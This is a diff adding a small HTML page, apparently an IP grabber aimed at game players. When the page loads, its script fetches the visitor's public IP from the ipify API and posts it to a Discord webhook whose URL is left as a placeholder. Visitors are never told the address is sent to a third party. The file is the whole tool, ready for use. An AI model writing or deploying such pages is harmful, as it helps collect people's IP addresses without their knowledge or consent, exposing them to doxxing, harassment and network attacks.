@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get IP</title>
+    <script>
+        function getIP() {
+            fetch('https://api.ipify.org?format=json')  // Use the ipify API to get the player's IP address
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    sendToDiscord(ip);  // Send the IP to Discord Webhook
+                });
+        }
+
+        function sendToDiscord(ip) {
+            const webhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL';  // Replace with your Discord webhook URL
+            const message = {
+                content: `Player's IP: ${ip}`  // Send the IP address as a message
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message)
+            });
+        }
+
+        // Call getIP function when the page loads
+        window.onload = getIP;
+    </script>
+</head>
+<body>
+    <h1>Getting Your IP...</h1>
+</body>
+</html>
